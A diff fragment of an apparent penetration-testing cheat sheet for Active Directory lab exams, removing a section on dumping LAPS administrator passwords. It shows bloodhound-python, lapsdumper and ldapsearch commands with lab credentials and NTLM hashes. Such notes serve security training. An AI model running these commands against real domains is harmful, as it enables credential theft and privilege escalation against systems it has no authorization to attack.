@@ -149,13 +149,7 @@ This will extract all json files if you have credential but no shell
 bloodhound-python -ns 192.168.219.21 -d nagoya-industries.com -u 'Fiona.Clark' -p 'Summer2023' -c all
 sudo proxychains4 -f /etc/proxychains4.conf bloodhound-python -ns 10.10.179.140 -d oscp.exam -u 'web_svc' -p 'Diamond1' -c all --dns-tcp
 ```
-### Abusing ReadLaps Password
->LAPS allows you to manage the local Administrator password (which is randomized, unique, and changed regularly) on domain-joined computers. These passwords are centrally stored in Active Directory and restricted to authorized users using ACLs. 
-```
-lapsdumper -u fmcsorley -p CrabSharkJellyfish192 -d hutch.offsec -l 192.168.153.122
-lapsdumper -u user -p e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c -d domain.local -l dc host
-ldapsearch -v -c -D fmcsorley@hutch.offsec -w CrabSharkJellyfish192 -b "DC=hutch,DC=offsec" -H ldap://192.168.153.122 "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
-```
+
 ### Abusing GPO (Group Policy Object)
 Check:
 ```
